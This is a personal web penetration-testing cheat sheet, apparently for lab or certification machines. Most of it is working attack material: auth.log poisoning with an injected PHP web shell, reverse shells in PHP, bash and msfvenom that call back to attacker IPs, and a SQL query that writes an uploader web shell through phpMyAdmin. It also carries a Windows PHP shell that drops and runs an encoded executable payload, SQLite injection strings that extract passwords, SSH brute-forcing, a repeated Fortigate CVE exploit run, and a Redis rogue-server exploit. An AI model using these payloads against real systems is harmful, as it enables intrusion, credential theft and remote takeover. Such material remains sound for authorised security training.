Web Penetration Methodology:
View Page
View Source (Ctrl+U)
http://xx.xx.xx.xx/robots.txt
nikto -host xx.xx.xx.xx
whatweb http://xx.xx.xx.xx
dirb http://xx.xx.xx.xx
dirb http://xx.xx.xx.xx/ -X .php,.pl,.sh,.asp,.htm,.html,.xhtml,.json,.py,.cfm,.asp,.aspx,.rb,.cgi,.cer,.cfm,.css,.js,.jsp,.part,.txt,.text,.back

REMEMBER TO LOOK AT THE HEADERS IN THE SERVER RESPONSES IN BURPSUITE, ESPECIALLY FOR 3xx REDIRECTS
Options -> Intercept Server Responses -> Check Enabled for Condition "text"

Shell Upgrade:
python3 -c 'import pty; pty.spawn("/bin/bash")'

List Sudo Privileges:
$ sudo -l
(lowercase L)

hydra -L user.txt -P /usr/share/wordlists/rockyou.txt xx.xx.xx.xx -s <port> ssh -t 4

SMB ENUMERATION AND MOUNTING:
Enumeration:
enum4linux xx.xx.xx.xx
Mounting with No Password:
smbclient -U '%' -N \\\\xx.xx.xx.xx\\<SHARE>
Another Way to Mount Share:
xdg-open smb://xx.xx.xx.xx/

Poisoning the auth.log file:
If you can see the auth.log maybe you can poison it...
http://xx.xx.xx.xx/console/file.php?file=/var/log/auth.log
$ ssh '<?php system($_GET['cmd']); ?>'@xx.xx.xx.xx
...Encode this:
php -r '$sock=fsockopen("attacker_ip",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
(Using https://www.urlencoder.org/)
...Converts to:
php%20-r%20%27%24sock%3Dfsockopen%28%22xx.xx.xx.xx%22%2C4444%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
http://xx.xx.xx.xx/console/file.php?file=/var/log/auth.log&cmd=php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.49.60%22%2C4444%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27

Start Local Web Server on Kali:
$ sudo python3 -m http.server 80

Using Curl to Download a PHP Shell:
$ curl https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php --output ~/php-reverse-shell.php

Wget from Attackers Machine:
wget http://xx.xx.xx.xx/shell.php
curl.exe -O http://xx.xx.xx.xx/shell.php

Restart the Apache Server Under a Different (More Privileged) User:
cp /etc/apache2/apache2.conf .
sed -i 's/User ${APACHE_RUN_USER}/User mahakal/g' apache2.conf
sed -i 's/Group ${APACHE_RUN_GROUP}/Group mahakal/g' apache2.conf
cp apache2.conf /etc/apache2/apache2.conf
sudo /bin/systemctl restart apache2

PHP REVERSE SHELL (REPLACE xx.xx.xx.xx WITH ATTACKER IP):
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"xx.xx.xx.xx"/1234 0>&1'");?>

Make a NMAP Script that Escapes Restrictive Shell:
[if NMAP can be run as another user]:
$ TF=$(mktemp) 
$ echo 'os.execute("/bin/sh")' > $TF
$ sudo -u root nmap --script=$TF

TRY TO SCAN THROUGH PROXY:
curl --proxy http://xx.xx.xx.xx:3128 http://xx.xx.xx.xx
nmap -sV -Pn -n --proxies http://xx.xx.xx.xx:3128 xx.xx.xx.xx
SCANNING THROUGH PROXY USING SPOSE.PY:
git clone https://github.com/aancw/spose
cd spose
python spose.py --proxy http://xx.xx.xx.xx:3128 --target xx.xx.xx.xx
COULD EDIT THE SPOSE.PY SOURCE CODE AND ADD THESE TOP 1000 PORTS:
1,3,4,6,7,9,13,17,19,20,21,22,23,24,25,26,30,32,33,37,42,43,49,53,70,79,80,81,82,83,84,85,88,89,90,99,100,106,109,110,111,113,119,125,135,139,143,144,146,161,163,179,199,211,212,222,254,255,256,259,264,280,301,306,311,340,366,389,406,407,416,417,425,427,443,444,445,458,464,465,481,497,500,512,513,514,515,524,541,543,544,545,548,554,555,563,587,593,616,617,625,631,636,646,648,666,667,668,683,687,691,700,705,711,714,720,722,726,749,765,777,783,787,800,801,808,843,873,880,888,898,900,901,902,903,911,912,981,987,990,992,993,995,999,1000,1001,1002,1007,1009,1010,1011,1021,1022,1023,1024,1025,1026,1027,1028,1029,1030,1031,1032,1033,1034,1035,1036,1037,1038,1039,1040,1041,1042,1043,1044,1045,1046,1047,1048,1049,1050,1051,1052,1053,1054,1055,1056,1057,1058,1059,1060,1061,1062,1063,1064,1065,1066,1067,1068,1069,1070,1071,1072,1073,1074,1075,1076,1077,1078,1079,1080,1081,1082,1083,1084,1085,1086,1087,1088,1089,1090,1091,1092,1093,1094,1095,1096,1097,1098,1099,1100,1102,1104,1105,1106,1107,1108,1110,1111,1112,1113,1114,1117,1119,1121,1122,1123,1124,1126,1130,1131,1132,1137,1138,1141,1145,1147,1148,1149,1151,1152,1154,1163,1164,1165,1166,1169,1174,1175,1183,1185,1186,1187,1192,1198,1199,1201,1213,1216,1217,1218,1233,1234,1236,1244,1247,1248,1259,1271,1272,1277,1287,1296,1300,1301,1309,1310,1311,1322,1328,1334,1352,1417,1433,1434,1443,1455,1461,1494,1500,1501,1503,1521,1524,1533,1556,1580,1583,1594,1600,1641,1658,1666,1687,1688,1700,1717,1718,1719,1720,1721,1723,1755,1761,1782,1783,1801,1805,1812,1839,1840,1862,1863,1864,1875,1900,1914,1935,1947,1971,1972,1974,1984,1998,1999,2000,2001,2002,2003,2004,2005,2006,2007,2008,2009,2010,2013,2020,2021,2022,2030,2033,2034,2035,2038,2040,2041,2042,2043,2045,2046,2047,2048,2049,2065,2068,2099,2100,2103,2105,2106,2107,2111,2119,2121,2126,2135,2144,2160,2161,2170,2179,2190,2191,2196,2200,2222,2251,2260,2288,2301,2323,2366,2381,2382,2383,2393,2394,2399,2401,2492,2500,2522,2525,2557,2601,2602,2604,2605,2607,2608,2638,2701,2702,2710,2717,2718,2725,2800,2809,2811,2869,2875,2909,2910,2920,2967,2968,2998,3000,3001,3003,3005,3006,3007,3011,3013,3017,3030,3031,3052,3071,3077,3128,3168,3211,3221,3260,3261,3268,3269,3283,3300,3301,3306,3322,3323,3324,3325,3333,3351,3367,3369,3370,3371,3372,3389,3390,3404,3476,3493,3517,3527,3546,3551,3580,3659,3689,3690,3703,3737,3766,3784,3800,3801,3809,3814,3826,3827,3828,3851,3869,3871,3878,3880,3889,3905,3914,3918,3920,3945,3971,3986,3995,3998,4000,4001,4002,4003,4004,4005,4006,4045,4111,4125,4126,4129,4224,4242,4279,4321,4343,4443,4444,4445,4446,4449,4550,4567,4662,4848,4899,4900,4998,5000,5001,5002,5003,5004,5009,5030,5033,5050,5051,5054,5060,5061,5080,5087,5100,5101,5102,5120,5190,5200,5214,5221,5222,5225,5226,5269,5280,5298,5357,5405,5414,5431,5432,5440,5500,5510,5544,5550,5555,5560,5566,5631,5633,5666,5678,5679,5718,5730,5800,5801,5802,5810,5811,5815,5822,5825,5850,5859,5862,5877,5900,5901,5902,5903,5904,5906,5907,5910,5911,5915,5922,5925,5950,5952,5959,5960,5961,5962,5963,5987,5988,5989,5998,5999,6000,6001,6002,6003,6004,6005,6006,6007,6009,6025,6059,6100,6101,6106,6112,6123,6129,6156,6346,6389,6502,6510,6543,6547,6565,6566,6567,6580,6646,6666,6667,6668,6669,6689,6692,6699,6779,6788,6789,6792,6839,6881,6901,6969,7000,7001,7002,7004,7007,7019,7025,7070,7100,7103,7106,7200,7201,7402,7435,7443,7496,7512,7625,7627,7676,7741,7777,7778,7800,7911,7920,7921,7937,7938,7999,8000,8001,8002,8007,8008,8009,8010,8011,8021,8022,8031,8042,8045,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8093,8099,8100,8180,8181,8192,8193,8194,8200,8222,8254,8290,8291,8292,8300,8333,8383,8400,8402,8443,8500,8600,8649,8651,8652,8654,8701,8800,8873,8888,8899,8994,9000,9001,9002,9003,9009,9010,9011,9040,9050,9071,9080,9081,9090,9091,9099,9100,9101,9102,9103,9110,9111,9200,9207,9220,9290,9415,9418,9485,9500,9502,9503,9535,9575,9593,9594,9595,9618,9666,9876,9877,9878,9898,9900,9917,9929,9943,9944,9968,9998,9999,10000,10001,10002,10003,10004,10009,10010,10012,10024,10025,10082,10180,10215,10243,10566,10616,10617,10621,10626,10628,10629,10778,11110,11111,11967,12000,12174,12265,12345,13456,13722,13782,13783,14000,14238,14441,14442,15000,15002,15003,15004,15660,15742,16000,16001,16012,16016,16018,16080,16113,16992,16993,17877,17988,18040,18101,18988,19101,19283,19315,19350,19780,19801,19842,20000,20005,20031,20221,20222,20828,21571,22939,23502,24444,24800,25734,25735,26214,27000,27352,27353,27355,27356,27715,28201,30000,30718,30951,31038,31337,32768,32769,32770,32771,32772,32773,32774,32775,32776,32777,32778,32779,32780,32781,32782,32783,32784,32785,33354,33899,34571,34572,34573,35500,38292,40193,40911,41511,42510,44176,44442,44443,44501,45100,48080,49152,49153,49154,49155,49156,49157,49158,49159,49160,49161,49163,49165,49167,49175,49176,49400,49999,50000,50001,50002,50003,50006,50300,50389,50500,50636,50800,51103,51493,52673,52822,52848,52869,54045,54328,55055,55056,55555,55600,56737,56738,57294,57797,58080,60020,60443,61532,61900,62078,63331,64623,64680,65000,65129,65389

PHPMYADMIN INFO:
Default Username: root
Default Password: <none>
REVERSE SHELL:
Go to the SQL tab and run the following query:
SELECT "<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>" INTO OUTFILE 'C:/wamp/www/uploader.php'
Open a new tab and go to:
http://xx.xx.xx.xx:port/uploader.php
Upload a PHP file containing a reverse shell:
Windows PHP REVERSE SHELL:
https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php (SEE BELOW FOR CODE)
Edit the PHP code to include the attacker IP and listening port.
Start a netcat listener (nc -lvp 4444).
Update the shell using the uploader.
Then, open a new tab and go to:
http://xx.xx.xx.xx:port/reverse-shell.php

SPOOFING SOURCE IP ADDRESS OF TRAFFIC:
Add an IPTABLES rule:
sudo iptables -t nat -A POSTROUTING -j SNAT --to-source 10.10.10.10
Delete an IPTABLES rule:
sudo iptables -t nat -D POSTROUTING -j SNAT --to-source 10.10.10.10
Confirm with:
sudo tcpdump -i eth0
Add header to Burpsuite before sending to website:
X-Forwarded-For: 10.10.10.10
Burpsuite -> Options -> Add -> Request Header


WINDOWS PRIVILEGE ESCALATION (PRIVESC):
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe
curl.exe -O http://192.168.49.122/winPEASany_ofs.exe

LAY OF THE LAND IN WINDOWS:
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
netstat â€“nao

CHECK PRIVILEGES ON WINDOWS:
whoami /priv
whoami /groups

SEARCH INSIDE FILES IN WINDOWS FROM THE COMMAND LINE (IGNORING "CANNOT OPEN" MESSAGES):
findstr /sim /C:"administrator:" *.* * 2>nul


PHP REVERSE SHELL FOR WINDOWS:
<?php
header('Content-type: text/plain');
$ip   = "192.168.1.9"; //change this 
$port = "1234"; //change this
$payload = "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";
$evalCode = gzinflate(base64_decode($payload));
$evalArguments = " ".$port." ".$ip;
$tmpdir ="C:\\windows\\temp";
chdir($tmpdir);
$res .= "Using dir : ".$tmpdir;
$filename = "D3fa1t_shell.exe";
$file = fopen($filename, 'wb');
fwrite($file, $evalCode);
fclose($file);
$path = $filename;
$cmd = $path.$evalArguments;
$res .= "\n\nExecuting : ".$cmd."\n";
echo $res;
$output = system($cmd);		            
?>

SQL INJECTION (MOSTLY SQLITE SPECIFIC):
Find SQLite Version:
' UNION ALL SELECT NULL,NULL,sqlite_version(),NULL --
Find the Table Names:
' UNION ALL SELECT NULL,NULL,tbl_name,NULL FROM sqlite_master --
Find the Column Names:
' UNION ALL SELECT NULL,NULL,sql,NULL FROM sqlite_master --
Extract Data from the Tables (Based on Column Names from Above):
' UNION ALL SELECT NULL,NULL,id||' '||first_name||' '||last_name||' '||hidden,NULL FROM emps --
' UNION ALL SELECT NULL,NULL,id||' '||first_name||' '||last_name||' '||password,NULL FROM employees --

CURL COMMANDS:
Send cURL traffic through Burpsuite:
curl -d "" -X POST http://xx.xx.xx.xx:33333/directory/directory --proxy 127.0.0.1:8080 

Note that -d "" doesn't send no data:
curl -d "" -X POST http://192.168.122.99:33333/list-running-procs --proxy 127.0.0.1:8080
The header looks like this:
POST /list-running-procs HTTP/1.1
Host: 192.168.122.99:33333
User-Agent: curl/7.79.1
Accept: */*
Content-Length: 0
Content-Type: application/x-www-form-urlencoded
Connection: close

DOWNLOAD WINDOWS FILE TO LINUX WITH SSH CREDENTIALS:
scp ssh_user@xx.xx.xx.xx:/dir/file_to_download.pdf /home/kali/subfolder/

CRACKING PDF FILES:
find / -name rockyou.txt 2>/dev/null
pdfcrack -f ./file_to_crack.pdf --wordlist /usr/share/wordlists/rockyou.txt

RUN A COMMAND EVERY 5 MINUTES:
while true; do python CVE-2018-13379.py fortigate_ip.txt; date; sleep 5; done

LINUX PRIVILEGE ESCALATION (LINUX PRIVESC):
sudo -l
sudo su
find / -perm -u=s -type f 2>/dev/null
or
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

SSH PASSWORD GUESSING:
hydra -L user.txt -P /usr/share/wordlists/rockyou.txt xx.xx.xx.xx ssh -t 4

MSVENOM:
msfvenom -p linux/x64/shell_reverse_tcp -f elf -o reverse.elf LHOST=192.168.49.135 LPORT=445
chmod +x /tmp/reverse.elf
/tmp/reverse.elf

USING SNMP TO ENUMERATE USERS:
nmap --script=smtp-enum-users -p 25 xx.xx.xx.xx
nmap --script=smtp-enum-users -p 25 xx.xx.xx.xx | grep "|" | cut -d " " -f4

TCPDUMP TO DETECT BLIND COMMAND SUCCESS:
sudo tcpdump -nni tun0  icmp and host <victim_ip>
Then, run exploit with the command:
ping -c 4 <attacker_ip>

REDIS SERVER ENUMERATION AND EXPLOITATION:
redis-cli -h 192.168.66.69
Run "info" command at prompt. If it asks for auth, then it may not be vulnerable.
The only non-Metaploit exploit I could get to run was this one, with this command exactly (you have to set the lport to 6379
or it hangs after "Setting dbfilename..." and run it more than one time, because it crashed on me the first time, but run successfully the second time...
and I also could not get the reverse shell option to work, but interactive worked fine.):
git clone https://github.com/n0b0dyCN/redis-rogue-server.git
python3 redis-rogue-server.py --rhost <target_ip> --rport 6379 --lhost <attacking_ip> --lport 6379
More info and other exploit options here:
https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis

